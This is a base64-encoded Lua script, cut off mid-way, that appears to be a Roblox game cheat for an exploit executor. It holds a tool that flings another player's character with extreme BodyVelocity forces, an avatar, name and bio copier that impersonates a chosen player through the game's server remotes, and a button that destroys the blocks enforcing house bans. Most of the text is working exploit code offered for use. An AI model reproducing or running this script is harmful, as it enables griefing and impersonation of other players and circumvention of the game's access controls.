Z3M9e1sxXT0iUGlja2luZ1Rvb2xzIixbMl09IlNvY2NlckJhbGwifQpnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFUb28xbCIpOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCnRhc2sud2FpdCgpCnBsYXllci5CYWNrcGFjay5Tb2NjZXJCYWxsLlBhcmVudD1wbGF5ZXIuQ2hhcmFjdGVyCnJlcGVhdCBNeUJhbGw9U29jY2VyQmFsbHM6RmluZEZpcnN0Q2hpbGQoIlNvY2NlciIuLnBsYXllci5OYW1lKSB0YXNrLndhaXQoKSB1bnRpbCBNeUJhbGwKcGxheWVyLkNoYXJhY3Rlci5Tb2NjZXJCYWxsLlBhcmVudD1wbGF5ZXIuQmFja3BhY2sKdGFzay53YWl0KCkKZWxzZQpwbGF5ZXIuQmFja3BhY2suU29jY2VyQmFsbC5QYXJlbnQ9cGxheWVyLkNoYXJhY3RlcgpyZXBlYXQgTXlCYWxsPVNvY2NlckJhbGxzOkZpbmRGaXJzdENoaWxkKCJTb2NjZXIiLi5wbGF5ZXIuTmFtZSkgdGFzay53YWl0KCkgdW50aWwgTXlCYWxsCnBsYXllci5DaGFyYWN0ZXIuU29jY2VyQmFsbC5QYXJlbnQ9cGxheWVyLkJhY2twYWNrCmVuZAplbmQKCgpmb3IgaSx2IGluIHBhaXJzKGdhbWUuUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCmlmIHZ+PWdhbWUuUGxheWVycy5Mb2NhbFBsYXllciB0aGVuCmxvY2FsIHRhcmdldD12CmxvY2FsIFRDaGFyYWN0ZXI9dGFyZ2V0LkNoYXJhY3RlciBvciB0YXJnZXQuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCmxvY2FsIFRIdW1hbm9pZFJvb3RQYXJ0PVRDaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKaWYgbm90IE15QmFsbCBvciBub3QgVEh1bWFub2lkUm9vdFBhcnQgdGhlbiByZXR1cm4gZW5kCgpmb3IgXyx2IGluIHBhaXJzKE15QmFsbDpHZXRDaGlsZHJlbigpKSBkbwppZiB2OklzQSgiQm9keU1vdmVyIikgdGhlbiB2OkRlc3Ryb3koKSBlbmQKZW5kCgpsb2NhbCBib2R5VmVsb2NpdHk9SW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQpib2R5VmVsb2NpdHkuVmVsb2NpdHk9VmVjdG9yMy5uZXcoOWU4LDllOCw5ZTgpCmJvZHlWZWxvY2l0eS5NYXhGb3JjZT1WZWN0b3IzLm5ldygxLzAsMS8wLDEvMCkKYm9keVZlbG9jaXR5LlA9MWUxMApib2R5VmVsb2NpdHkuUGFyZW50PU15QmFsbAoKbG9jYWwgYnY9SW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQpidi5WZWxvY2l0eT1WZWN0b3IzLm5ldyg5ZTgsOWU4LDllOCkKYnYuTWF4Rm9yY2U9VmVjdG9yMy5uZXcoMS8wLDEvMCwxLzApCmJ2LlA9MWU5CmJ2LlBhcmVudD1USHVtYW5vaWRSb290UGFydAoKbG9jYWwgb2xkUG9zPVRIdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uCndvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3Q9VEh1bWFub2lkUm9vdFBhcnQKCnJlcGVhdApsb2NhbCB2ZWxvY2l0eT1USHVtYW5vaWRSb290UGFydC5WZWxvY2l0eS5NYWduaXR1ZGUKbG9jYWwgcGFydHM9e30KZm9yIF8sdiBpbiBwYWlycyhUQ2hhcmFjdGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCmlmIHY6SXNBKCJCYXNlUGFydCIpIGFuZCB2LkNhbkNvbGxpZGUgYW5kIG5vdCB2LkFuY2hvcmVkIHRoZW4gdGFibGUuaW5zZXJ0KHBhcnRzLHYpIGVuZAplbmQKZm9yIF8scGFydCBpbiBpcGFpcnMocGFydHMpIGRvCmxvY2FsIHBvc194PXRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbi5YCmxvY2FsIHBvc195PXRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbi5ZCmxvY2FsIHBvc196PXRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbi5aCnBvc194PXBvc194Kyh0YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuWC8xLjUpCnBvc195PXBvc195Kyh0YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuWS8xLjUpCnBvc196PXBvc196Kyh0YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuWi8xLjUpCk15QmFsbC5DRnJhbWU9Q0ZyYW1lLm5ldyhwb3NfeCxwb3NfeSxwb3NfeikKdGFzay53YWl0KDEvNjAwMCkKZW5kCnRhc2sud2FpdCgxLzYwMDApCnVudGlsIFRIdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZT41MDAwIG9yIFRDaGFyYWN0ZXIuSHVtYW5vaWQuSGVhbHRoPT0wIG9yIHRhcmdldC5QYXJlbnR+PWdhbWUuUGxheWVycyBvciBUSHVtYW5vaWRSb290UGFydC5QYXJlbnR+PVRDaGFyYWN0ZXIgb3IgVENoYXJhY3Rlcn49dGFyZ2V0LkNoYXJhY3RlcgoKZW5kCmVuZAoKd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdD1nYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgZW5kCn0pCgoKbG9jYWwgVGFiID0gV2luZG93Ok1ha2VUYWIoeyLvuLFBdmF0YXIiLCAicmJ4YXNzZXRpZDovLzkzMDA5NzM1OTY3MTg1In0pCgpUYWI6QWRkU2VjdGlvbih7IE5hbWUgPSAiQ29weSBvdXRmaXQiIH0pCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgUmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKbG9jYWwgUmVtb3RlcyA9IFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiUmVtb3RlcyIpCgpsb2NhbCBUYXJnZXQgPSBuaWwKCmxvY2FsIGZ1bmN0aW9uIEdldFBsYXllck5hbWVzKCkKICAgIGxvY2FsIFBsYXllck5hbWVzID0ge30KICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgIHRhYmxlLmluc2VydChQbGF5ZXJOYW1lcywgcGxheWVyLk5hbWUpCiAgICBlbmQKICAgIHJldHVybiBQbGF5ZXJOYW1lcwplbmQKCmxvY2FsIERyb3Bkb3duID0gVGFiOkFkZERyb3Bkb3duKHsKICAgIE5hbWUgPSAiQ2hvb3NlIHBsYXllcjoiLAogICAgT3B0aW9ucyA9IEdldFBsYXllck5hbWVzKCksCiAgICBEZWZhdWx0ID0gVGFyZ2V0LAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBUYXJnZXQgPSBWYWx1ZQogICAgZW5kCn0pCgpsb2NhbCBmdW5jdGlvbiBVcGRhdGVEcm9wZG93bigpCiAgICBEcm9wZG93bjpSZWZyZXNoT3B0aW9ucyhHZXRQbGF5ZXJOYW1lcygpKQplbmQKClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChVcGRhdGVEcm9wZG93bikKUGxheWVycy5QbGF5ZXJSZW1vdmluZzpDb25uZWN0KFVwZGF0ZURyb3Bkb3duKQoKVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkNvcHkgdGhlIHBsYXllcidzIGF2YXRhciIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBub3QgVGFyZ2V0IHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBsb2NhbCBMUCA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBMQ2hhciA9IExQLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIFRQbGF5ZXIgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKFRhcmdldCkKCiAgICAgICAgaWYgVFBsYXllciBhbmQgVFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICBsb2NhbCBMSHVtYW5vaWQgPSBMQ2hhciBhbmQgTENoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgIGxvY2FsIFRIdW1hbm9pZCA9IFRQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQoKICAgICAgICAgICAgaWYgTEh1bWFub2lkIGFuZCBUSHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgLS0gUkVTRVQgTE9DQUxQTEFZRVIKICAgICAgICAgICAgICAgIGxvY2FsIExEZXNjID0gTEh1bWFub2lkOkdldEFwcGxpZWREZXNjcmlwdGlvbigpCgogICAgICAgICAgICAgICAgLS0gUmVtb3ZlIGN1cnJlbnQgYWNjZXNzb3JpZXMsIGNsb3RoZXMsIGFuZCBmYWNlCiAgICAgICAgICAgICAgICBmb3IgXywgYWNjIGluIGlwYWlycyhMRGVzYzpHZXRBY2Nlc3Nvcmllcyh0cnVlKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBhY2MuQXNzZXRJZCBhbmQgdG9udW1iZXIoYWNjLkFzc2V0SWQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFyOkludm9rZVNlcnZlcih0b251bWJlcihhY2MuQXNzZXRJZCkpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiB0b251bWJlcihMRGVzYy5TaGlydCkgdGhlbgogICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuV2VhcjpJbnZva2VTZXJ2ZXIodG9udW1iZXIoTERlc2MuU2hpcnQpKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiB0b251bWJlcihMRGVzYy5QYW50cykgdGhlbgogICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuV2VhcjpJbnZva2VTZXJ2ZXIodG9udW1iZXIoTERlc2MuUGFudHMpKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiB0b251bWJlcihMRGVzYy5GYWNlKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFyOkludm9rZVNlcnZlcih0b251bWJlcihMRGVzYy5GYWNlKSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgLS0gQ09QWSBGUk9NIFRBUkdFVCBQTEFZRVIKICAgICAgICAgICAgICAgIGxvY2FsIFBEZXNjID0gVEh1bWFub2lkOkdldEFwcGxpZWREZXNjcmlwdGlvbigpCgogICAgICAgICAgICAgICAgLS0gU2VuZCBib2R5IHBhcnRzCiAgICAgICAgICAgICAgICBsb2NhbCBhcmdzQm9keSA9IHsKICAgICAgICAgICAgICAgICAgICBbMV0gPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9IFBEZXNjLlRvcnNvLAogICAgICAgICAgICAgICAgICAgICAgICBbMl0gPSBQRGVzYy5SaWdodEFybSwKICAgICAgICAgICAgICAgICAgICAgICAgWzNdID0gUERlc2MuTGVmdEFybSwKICAgICAgICAgICAgICAgICAgICAgICAgWzRdID0gUERlc2MuUmlnaHRMZWcsCiAgICAgICAgICAgICAgICAgICAgICAgIFs1XSA9IFBEZXNjLkxlZnRMZWcsCiAgICAgICAgICAgICAgICAgICAgICAgIFs2XSA9IFBEZXNjLkhlYWQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBSZW1vdGVzLkNoYW5nZUNoYXJhY3RlckJvZHk6SW52b2tlU2VydmVyKHVucGFjayhhcmdzQm9keSkpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQoKICAgICAgICAgICAgICAgIGlmIHRvbnVtYmVyKFBEZXNjLlNoaXJ0KSB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFyOkludm9rZVNlcnZlcih0b251bWJlcihQRGVzYy5TaGlydCkpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMykKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIHRvbnVtYmVyKFBEZXNjLlBhbnRzKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFyOkludm9rZVNlcnZlcih0b251bWJlcihQRGVzYy5QYW50cykpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMykKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIHRvbnVtYmVyKFBEZXNjLkZhY2UpIHRoZW4KICAgICAgICAgICAgICAgICAgICBSZW1vdGVzLldlYXI6SW52b2tlU2VydmVyKHRvbnVtYmVyKFBEZXNjLkZhY2UpKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjMpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMoUERlc2M6R2V0QWNjZXNzb3JpZXModHJ1ZSkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdi5Bc3NldElkIGFuZCB0b251bWJlcih2LkFzc2V0SWQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFyOkludm9rZVNlcnZlcih0b251bWJlcih2LkFzc2V0SWQpKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgU2tpbkNvbG9yID0gVFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkJvZHkgQ29sb3JzIikKICAgICAgICAgICAgICAgIGlmIFNraW5Db2xvciB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5DaGFuZ2VCb2R5Q29sb3I6RmlyZVNlcnZlcih0b3N0cmluZyhTa2luQ29sb3IuSGVhZENvbG9yKSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgdG9udW1iZXIoUERlc2MuSWRsZUFuaW1hdGlvbikgdGhlbgogICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuV2VhcjpJbnZva2VTZXJ2ZXIodG9udW1iZXIoUERlc2MuSWRsZUFuaW1hdGlvbikpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMykKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIC0tIE5hbWUsIGJpbywgYW5kIGNvbG9yCiAgICAgICAgICAgICAgICBsb2NhbCBCYWcgPSBUUGxheWVyOkZpbmRGaXJzdENoaWxkKCJQbGF5ZXJzQmFnIikKICAgICAgICAgICAgICAgIGlmIEJhZyB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgQmFnOkZpbmRGaXJzdENoaWxkKCJSUE5hbWUiKSBhbmQgQmFnLlJQTmFtZS5WYWx1ZSB+PSAiIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuUlBOYW1lVGV4dDpGaXJlU2VydmVyKCJSb2xlUGxheU5hbWUiLCBCYWcuUlBOYW1lLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIEJhZzpGaW5kRmlyc3RDaGlsZCgiUlBCaW8iKSBhbmQgQmFnLlJQQmlvLlZhbHVlIH49ICIiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5SUE5hbWVUZXh0OkZpcmVTZXJ2ZXIoIlJvbGVQbGF5QmlvIiwgQmFnLlJQQmlvLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIEJhZzpGaW5kRmlyc3RDaGlsZCgiUlBOYW1lQ29sb3IiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuUlBOYW1lQ29sb3I6RmlyZVNlcnZlcigiUGlja2luZ1JQTmFtZUNvbG9yIiwgQmFnLlJQTmFtZUNvbG9yLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIEJhZzpGaW5kRmlyc3RDaGlsZCgiUlBCaW9Db2xvciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5SUE5hbWVDb2xvcjpGaXJlU2VydmVyKCJQaWNraW5nUlBCaW9Db2xvciIsIEJhZy5SUEJpb0NvbG9yLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgpUYWI6QWRkU2VjdGlvbih7ICLwn4+777ixUmFpbmJvdyBBdmF0YXIiIH0pCgpsb2NhbCBjb2xvcnMgPSB7ICJCcmlnaHQgcmVkIiwgIkxpbWUgZ3JlZW4iLCAiQnJpZ2h0IGJsdWUiLCAiQnJpZ2h0IHllbGxvdyIsICJCcmlnaHQgY3lhbiIsICJIb3QgcGluayIsICJSb3lhbCBwdXJwbGUiIH0KbG9jYWwgcmdiRW5hYmxlZCA9IGZhbHNlCgpsb2NhbCBmdW5jdGlvbiBjaGFuZ2VDb2xvcihjb2xvcikKICAgIGxvY2FsIGFyZ3MgPSB7IGNvbG9yIH0KICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoIlJlbW90ZXMiKTpXYWl0Rm9yQ2hpbGQoIkNoYW5nZUJvZHlDb2xvciIpOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQplbmQKCmxvY2FsIGZ1bmN0aW9uIHRvZ2dsZVJHQkNoYXJhY3RlcihlbmFibGVkKQogICAgcmdiRW5hYmxlZCA9IGVuYWJsZWQKICAgIGlmIHJnYkVuYWJsZWQgdGhlbgogICAgICAgIHdoaWxlIHJnYkVuYWJsZWQgZG8KICAgICAgICAgICAgZm9yIF8sIGNvbG9yIGluIGlwYWlycyhjb2xvcnMpIGRvCiAgICAgICAgICAgICAgICBpZiBub3QgcmdiRW5hYmxlZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGNoYW5nZUNvbG9yKGNvbG9yKQogICAgICAgICAgICAgICAgd2FpdCgwLjAxKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQKClRhYjpBZGRUb2dnbGUoewogICAgTmFtZSA9ICJDaGFyYWN0ZXIiLAogICAgRGVzY3JpcHRpb24gPSAi8J+ThO+4sVR1cm5zIHlvdXIgY2hhcmFjdGVyIHdpdGggbXVsdGlwbGUgY29sb3JzLiIsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgIHRvZ2dsZVJHQkNoYXJhY3Rlcih2YWx1ZSkKICAgIGVuZAp9KQoKClRhYjpBZGRTZWN0aW9uKHsgIvCfprPvuLFSYWluYm93IEhhaXIiIH0pCmxvY2FsIGhhaXJDb2xvcnMgPSB7CiAgICBDb2xvcjMubmV3KDEsIDEsIDApLCBDb2xvcjMubmV3KDAsIDAsIDEpLCBDb2xvcjMubmV3KDEsIDAsIDEpLCBDb2xvcjMubmV3KDEsIDEsIDEpLAogICAgQ29sb3IzLm5ldygwLCAxLCAwKSwgQ29sb3IzLm5ldygwLjUsIDAsIDEpLCBDb2xvcjMubmV3KDEsIDAuNjQ3LCAwKSwgQ29sb3IzLm5ldygwLCAxLCAxKQp9CmxvY2FsIGlzQWN0aXZlID0gZmFsc2UKCgpsb2NhbCBmdW5jdGlvbiBjaGFuZ2VIYWlyQ29sb3IoKQogICAgbG9jYWwgaSA9IDEKICAgIHdoaWxlIGlzQWN0aXZlIGRvCiAgICAgICAgaWYgbm90IGlzQWN0aXZlIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgbG9jYWwgYXJncyA9IHsgWzFdID0gIkNoYW5nZUhhaXJDb2xvcjIiLCBbMl0gPSBoYWlyQ29sb3JzW2ldIH0KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJSRSIpOldhaXRGb3JDaGlsZCgiMU1heDF5Iik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgd2FpdCgwLjAxKQogICAgICAgIGkgPSBpICUgI2hhaXJDb2xvcnMgKyAxCiAgICBlbmQKZW5kCgoKVGFiOkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gIkhhaXIiLAogICAgRGVzY3JpcHRpb24gPSAi8J+ThO+4sVR1cm5zIHlvdXIgaGFpciB3aXRoIG11bHRpcGxlIGNvbG9ycy4iLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBpc0FjdGl2ZSA9IHZhbHVlCiAgICAgICAgaWYgaXNBY3RpdmUgdGhlbgogICAgICAgICAgICBjaGFuZ2VIYWlyQ29sb3IoKQogICAgICAgIGVuZAogICAgZW5kCn0pCgoKLS0gRGVmaW5lIGNvbG9ycyBmb3IgUkdCIGVmZmVjdApsb2NhbCBjb2xvcnMgPSB7CiAgICBDb2xvcjMubmV3KDEsIDAsIDApLCAgICAgICAtLSBSZWQKICAgIENvbG9yMy5uZXcoMCwgMSwgMCksICAgICAgIC0tIEdyZWVuCiAgICBDb2xvcjMubmV3KDAsIDAsIDEpLCAgICAgICAtLSBCbHVlCiAgICBDb2xvcjMubmV3KDEsIDEsIDApLCAgICAgICAtLSBZZWxsb3cKICAgIENvbG9yMy5uZXcoMCwgMSwgMSksICAgICAgIC0tIEN5YW4KICAgIENvbG9yMy5uZXcoMSwgMCwgMSkgICAgICAgIC0tIE1hZ2VudGEKfQoKLS0gVmFyaWFibGUgdG8gY29udHJvbCB0aGUgc3RhdGUgb2YgdGhlIEhvdXNlIFJHQiB0b2dnbGUKbG9jYWwgaXNIb3VzZVJHQkFjdGl2ZSA9IGZhbHNlCgotLSBGdW5jdGlvbiB0byBjaGFuZ2UgdGhlIGhvdXNlIGNvbG9yCmxvY2FsIGZ1bmN0aW9uIGNoYW5nZUNvbG9yKCkKICAgIGxvY2FsIHJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCiAgICBsb2NhbCByZW1vdGVFdmVudCA9IHJlcGxpY2F0ZWRTdG9yYWdlOkZpbmRGaXJzdENoaWxkKCJSRSIpIGFuZCByZXBsaWNhdGVkU3RvcmFnZS5SRTpGaW5kRmlyc3RDaGlsZCgiMVBsYXllcjFzSG91czFlIikKICAgIAogICAgaWYgbm90IHJlbW90ZUV2ZW50IHRoZW4KICAgICAgICB3YXJuKCJSZW1vdGVFdmVudCAnMVBsYXllcjFzSG91czFlJyBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIHdoaWxlIGlzSG91c2VSR0JBY3RpdmUgZG8KICAgICAgICBmb3IgXywgY29sb3IgaW4gaXBhaXJzKGNvbG9ycykgZG8KICAgICAgICAgICAgaWYgbm90IGlzSG91c2VSR0JBY3RpdmUgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICBbMV0gPSAiQ29sb3JQaWNrSG91c2UiLAogICAgICAgICAgICAgICAgWzJdID0gY29sb3IKICAgICAgICAgICAgfQogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICByZW1vdGVFdmVudDpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICB0YXNrLndhaXQoMC44KQogICAgICAgIGVuZAogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gdG9nZ2xlSG91c2VSR0Ioc3RhdGUpCiAgICBpc0hvdXNlUkdCQWN0aXZlID0gc3RhdGUKICAgIGlmIGlzSG91c2VSR0JBY3RpdmUgdGhlbgogICAgICAgIHByaW50KCJIb3VzZSBSR0IgQWN0aXZhdGVkIikKICAgICAgICBzcGF3bihjaGFuZ2VDb2xvcikKICAgIGVsc2UKICAgICAgICBwcmludCgiSG91c2UgUkdCIERlYWN0aXZhdGVkIikKICAgIGVuZAplbmQKCi0tIEdsb2JhbCB2YXJpYWJsZXMKbG9jYWwgaXNVbmJhbkFjdGl2ZSA9IGZhbHNlCmxvY2FsIEhvdXNlVGFiID0gV2luZG93Ok1ha2VUYWIoeyLvuLFIb3VzZXMiLCAicmJ4YXNzZXRpZDovLzEyOTYwNTczODExOTUwMSJ9KQpsb2NhbCBTZWxlY3RIb3VzZSA9IG5pbApsb2NhbCBOb2NsaXBEb29yID0gbmlsCgotLSBGdW5jdGlvbiB0byBnZXQgbGlzdCBvZiBob3VzZXMKbG9jYWwgZnVuY3Rpb24gZ2V0SG91c2VMaXN0KCkKICAgIGxvY2FsIGhvdXNlVGFibGUgPSB7fQogICAgbG9jYWwgbG90cyA9IHdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiMDAxX0xvdHMiKQogICAgaWYgbG90cyB0aGVuCiAgICAgICAgZm9yIF8sIEhvdXNlIGluIGlwYWlycyhsb3RzOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIEhvdXNlLk5hbWUgfj0gIkZvciBTYWxlIiBhbmQgSG91c2U6SXNBKCJNb2RlbCIpIHRoZW4KICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChob3VzZVRhYmxlLCBIb3VzZS5OYW1lKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIGhvdXNlVGFibGUKZW5kCgpIb3VzZVRhYjpBZGRQYXJhZ3JhcGgoewogICAgVGl0bGUgPSAiRnVuY3Rpb25zIHRvIHVzZSBvbiB5b3UiLAogICAgQ29udGVudCA9ICIiCn0pCgotLSBCb3TDo28gcGFyYSByZW1vdmVyIGJhbiBkZSB0b2RhcyBhcyBjYXNhcwpIb3VzZVRhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJSZW1vdmUgYmFuIGhvdXNlcyIsCiAgICBEZXNjcmlwdGlvbiA9ICLwn5OE77ixVHJ5IHJlbW92aW5nIGFsbCBiYW5zIGZyb20gdGhlIGhvdXNlcy4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgc3VjY2Vzc0NvdW50ID0gMAogICAgICAgIGxvY2FsIGZhaWxDb3VudCA9IDAKICAgICAgICBmb3IgaSA9IDEsIDM3IGRvCiAgICAgICAgICAgIGxvY2FsIGJhbm5lZEJsb2NrTmFtZSA9ICJCYW5uZWRCbG9jayIgLi4gaQogICAgICAgICAgICBsb2NhbCBiYW5uZWRCbG9jayA9IFdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZChiYW5uZWRCbG9ja05hbWUsIHRydWUpCiAgICAgICAgICAgIGlmIGJhbm5lZEJsb2NrIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHN1Y2Nlc3MsIF8gPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgYmFubmVkQmxvY2s6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBpZiBzdWNjZXNzIHRoZW4KICAgICAgICAgICAgICAgICAgICBzdWNjZXNzQ291bnQgPSBzdWNjZXNzQ291bnQgKyAxCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgZmFpbENvdW50ID0gZmFpbENvdW50ICsgMQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogIC